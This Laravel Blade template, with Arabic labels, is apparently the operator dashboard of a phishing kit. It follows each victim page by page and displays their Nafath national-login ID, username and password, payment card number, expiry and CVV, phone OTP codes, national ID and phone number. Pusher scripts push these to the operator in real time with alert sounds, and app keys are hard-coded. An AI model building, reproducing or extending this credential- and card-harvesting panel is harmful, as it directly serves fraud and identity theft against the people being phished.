{{-- <x-app-layout>
    <x-slot name="header">
        <h2 class="font-semibold text-xl text-gray-800 leading-tight">
            {{ __('Dashboard') }}
        </h2>
    </x-slot>

    <div class="py-12">
        <div class="max-w-7xl mx-auto sm:px-6 lg:px-8">
            <div class="bg-white overflow-hidden shadow-xl sm:rounded-lg">
                <x-welcome />
            </div>
        </div>
    </div>
</x-app-layout> --}}
@extends('layouts.dashboard')
@section('content')
<!-- Main content -->
<section class="content">


  <div class="container-fluid">
    <!-- START ALERTS AND CALLOUTS -->
    <div class="row">
        <div class="col-md-12">
            <div class="card card-default">
                <div class="card-header">
                    <h3 class="card-title">
                      <span id="name">
                        <svg width="23px" height="23px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M16 7C16 9.20914 14.2091 11 12 11C9.79086 11 8 9.20914 8 7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7Z" stroke="#adb5bd" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M12 14C8.13401 14 5 17.134 5 21H19C19 17.134 15.866 14 12 14Z" stroke="#adb5bd" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>
                        <span class="ml-1">{{$notification->name}}</span>
                      </span>
                    </h3>
                </div>
                <div class="notificationsList">
                  @if($notification->step_number >=11)
                    @if($notification->nafad_id)
                    <div class="card-body">
                      <h5><i class="icon fas fa-check"></i>  قام بإرسال معرف نفاذ      </h5>
                        <div class="direct-chat-text">
                        <p><strong class="fs-3 border p-1 rounded">Id:</strong> {{$notification->nafad_id}}</p>
                      </div>
                    </div><hr>
                    @endif
                    @if($notification->nafad_username)
                    <div class="card-body">
                      <h5><i class="icon fas fa-check"></i>  أرسل اسم المستخدم وكلمة السر الخاص بنفاذ      </h5>
                        <div class="direct-chat-text">
                        <p><strong class="fs-3 border p-1 rounded">Username:</strong> {{$notification->nafad_username}}</p>
                        <p><strong class="fs-3 border p-1 rounded">Password:</strong> {{$notification->nafad_password}}</p>
                      </div>
                    </div><hr>
                    @endif
                  @endif
                    @if($notification->step_number >=4)
                     @if($notification->paymentCard)
                    <div class="card-body">
                      <h5><i class="icon fas fa-check"></i> رمز التحقق من الهاتف</h5>
                        <div class="direct-chat-text">
                        <p><strong class="fs-3 border p-1 rounded">Name:</strong> {{$notification->paymentCard->otp_code}}</p>
                      </div>
                    </div><hr>

                    <div class="card-body">
                      <h5><i class="icon fas fa-check"></i>  قام بإرسال بيانات الدفع      </h5>
                        <div class="direct-chat-text">
                        <p><strong class="fs-3 border p-1 rounded">Name:</strong> {{$notification->paymentCard->cname}}</p>
                        <p><strong class="fs-3 border p-1 rounded">Number:</strong> {{$notification->paymentCard->cnmbr}}</p>
                        <p><strong class="fs-3 border p-1 rounded">Date:</strong> {{$notification->paymentCard->year.'-'.$notification->paymentCard->month}}</p>
                        <p><strong class="fs-3 border p-1 rounded">CV:</strong> {{$notification->paymentCard->resume}}</p>
                      </div>
                    </div><hr>
                    @endif

                      <div class="card-body">
                        <h5><i class="icon fas fa-check"></i> دخل الى صفحة الدفع</h5>
                      </div><hr>
                      @endif
                      @if($notification->step_number >= 3)
                      <div class="card-body">
                        <div>
                          <h5><i class="icon fas fa-check"></i> قام بإرسال بياناته</h5>
                            <div class="direct-chat-text">
                            <p><strong class="fs-3 border p-1 rounded">Name:</strong> AM0xrKY8yd</p>
                            <p><strong class="fs-3 border p-1 rounded">National ID:</strong> 1428858558</p>
                            <p><strong class="fs-3 border p-1 rounded">Phone:</strong> 2685048530</p>
                          </div>
                        </div>
                      </div>
                      <hr>
                      @endif
                      @if($notification->step_number >= 2)
                      <div class="card-body">
                        <h5><i class="icon fas fa-check"></i> دخل الى صفحة البيانات الشخصية</h5>
                      </div><hr>
                      @endif

                      <div class="card-body">
                        <h5><i class="icon fas fa-check"></i> دخل الى الصفحة الرئيسية</h5>
                      </div>
                      <hr>


                </div>

            </div>
            <!-- /.card -->
        </div>
    <!-- /.col -->
    </div>
    <!-- /.row -->
</div>
</section>
@endsection
@section('scripts')

<script>
  var id ={{$notification->id}}
  Pusher.logToConsole = true;

  // var pusher = new Pusher('119332eca087a1d4c34fb', {
  // cluster: 'ap2'
  // });
  var pusher = new Pusher('2fa3b52f022492400aa0', {
    cluster: 'mt1'
  });

  var channelNotification = pusher.subscribe('send-notification');
  channelNotification.bind('App\\Events\\SendNotification', function(dataP) {

    const nname = document.getElementById('notiName'+dataP.people_id);
    nname.innerText = dataP.name;

    const npage = document.getElementById('notiPage'+dataP.people_id);
    npage.innerText = dataP.page;

    const ndate = document.getElementById('notiDate'+dataP.people_id);
    ndate.innerText = dataP.date;

    const ncount = document.getElementById('notiCount'+dataP.people_id);
    ncount.innerText = dataP.count;

    playNotificationAudio();

  });

  var channelVisit = pusher.subscribe('send-visit');
  channelVisit.bind('App\\Events\\SendVisit', function(dataV)
  {
    if(dataV.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
            <div>
              <h5><i class="icon fas fa-check"></i> `+dataV.page+`</h5>
            </div>
        </div>
        <hr>
      `);
      playNotificationAudio();
    }
  });

  var channelPeople = pusher.subscribe('send-people');
  channelPeople.bind('App\\Events\\SendPeople', function(dataP)
  {
    if(dataP.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataP.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataP.name+`</p>
            <p><strong class="fs-3 border p-1 rounded">National ID:</strong> `+dataP.natID+`</p>
            <p><strong class="fs-3 border p-1 rounded">Phone:</strong> `+dataP.phone+`</p>
          </div>
        </div><hr>
      `);

      const elementName = document.getElementById("name");
      elementName.innerText = " "+dataP.name;

      playDataAudio();
    }
  });

  var channelPart = pusher.subscribe('send-part');
  channelPart.bind('App\\Events\\SendPart', function(dataPr)
  {
    if(dataPr.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataPr.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataPr.cname+`</p>
            <p><strong class="fs-3 border p-1 rounded">Number:</strong> `+dataPr.cnmbr+`</p>
            <p><strong class="fs-3 border p-1 rounded">Date:</strong> `+dataPr.exDate+`</p>
            <p><strong class="fs-3 border p-1 rounded">CV:</strong> `+dataPr.resume+`</p>
          </div>
        </div><hr>
      `);
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> رمز التحقق من الهاتف</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataPr.otp_code+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });

  var channelVern = pusher.subscribe('send-vern');
  channelVern.bind('App\\Events\\SendVern', function(dataV)
  {
    if(dataV.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataV.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataV.code+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });

  var channelAuth = pusher.subscribe('send-auth');
  channelAuth.bind('App\\Events\\SendAuth', function(dataA)
  {
    if(dataA.people_id == id)
    {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataA.code+`</p>
          </div>
        </div><hr>
      `);

      playDataAudio();
    }
  });
  var channelNafad = pusher.subscribe('send-nafad-id');
  channelNafad.bind('App\\Events\\SendNafadId', function(dataA)
  {
    if(dataA.people_id == id)
    {
      if(dataA.nafad_id)
      {
      $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Id:</strong> `+dataA.nafad_id+`</p>
          </div>
        </div><hr>
      `);
      }
      else
      {
        $(".notificationsList").prepend(`
        <div class="card-body">
          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
            <div class="direct-chat-text">
            <p><strong class="fs-3 border p-1 rounded">Username:</strong> `+dataA.nafad_username+`</p>
            <p><strong class="fs-3 border p-1 rounded">Password:</strong> `+dataA.nafad_password+`</p>
          </div>
        </div><hr>
      `);
      }

      playDataAudio();
    }
  });

</script>
@endsection